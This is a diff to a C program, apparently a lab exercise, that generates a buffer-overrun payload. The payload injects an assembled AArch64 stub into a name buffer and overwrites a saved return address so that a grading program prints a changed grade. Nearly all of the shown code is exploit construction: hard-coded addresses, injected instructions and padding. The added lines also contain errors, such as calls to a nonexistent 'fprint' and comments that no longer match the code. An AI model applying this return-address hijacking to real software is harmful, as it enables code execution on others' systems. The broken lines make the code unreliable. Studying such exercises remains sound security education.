@@ -19,7 +19,7 @@ int main(void)
     const unsigned long NAME_ADDR = 0x420058UL;  /* start of name[] in BSS */
     const unsigned long GRADE_ADDR = 0x420044UL; /* &grade global ('D') */
     const unsigned long PRINT_ADDR = 0x40089cUL;
-    unsigned long returnAddr = 0x420058UL + 12; /* skip-B, print-grade code */
+    unsigned long returnAddr = 0x420058UL + 16; /* skip-B, print-grade code */
 
     const unsigned long PRINTF_ADDR = 0x400690; /* Start of printf */
 
@@ -32,8 +32,17 @@ int main(void)
         fprintf(f, "%c", '\0');
     }
 
+    fprint(f, "%c", '%'); 
+    fprint(f, "%c", 'c'); 
+
+      /* e) Pad stub out to 48 bytes with null bytes" */
+    for (i = 0; i < 2; i++)
+    {
+        fprintf(f, "%c", '\0');
+    }
+
     /* 2) Emit a 48-byte stub into buf[] (and ultimately name[]): */
-    pc = NAME_ADDR + 12; /* at runtime, the stub’s first instr is at NAME_ADDR */
+    pc = NAME_ADDR + 16; /* at runtime, the stub’s first instr is at NAME_ADDR */
 
     /* a) ADR  X0, GRADE_ADDR(PC)   ; X0 ← &grade       */
     instr = MiniAssembler_adr(0, GRADE_ADDR, pc);
@@ -50,8 +59,12 @@ int main(void)
     fwrite(&instr, 4, 1, f);
     pc += 4;
 
+    instr = MiniAssembler_adr(0, NAME_ADDR + 12, pc); 
+    fwrite(&instr, 4, 1, f); 
+    pc+=4; 
+
     /* b) MOV  W0, #'A'             ; W1 ← ASCII 'A'   */
-    instr = MiniAssembler_mov(0, (int)'A');
+    instr = MiniAssembler_mov(1, (int)'A');
     fwrite(&instr, 4, 1, f);
     pc += 4;
 
@@ -73,11 +86,6 @@ int main(void)
     fwrite(&instr, 4, 1, f);
     pc += 4;
 
-    /* e) Pad stub out to 48 bytes with null bytes" */
-    for (i = 0; i < 4; i++)
-    {
-        fprintf(f, "%c", '\0');
-    }
 
     /* 3) Overwrite readString’s saved x30 with NAME_ADDR
         so that when readString does `ret`, it jumps into our stub. */
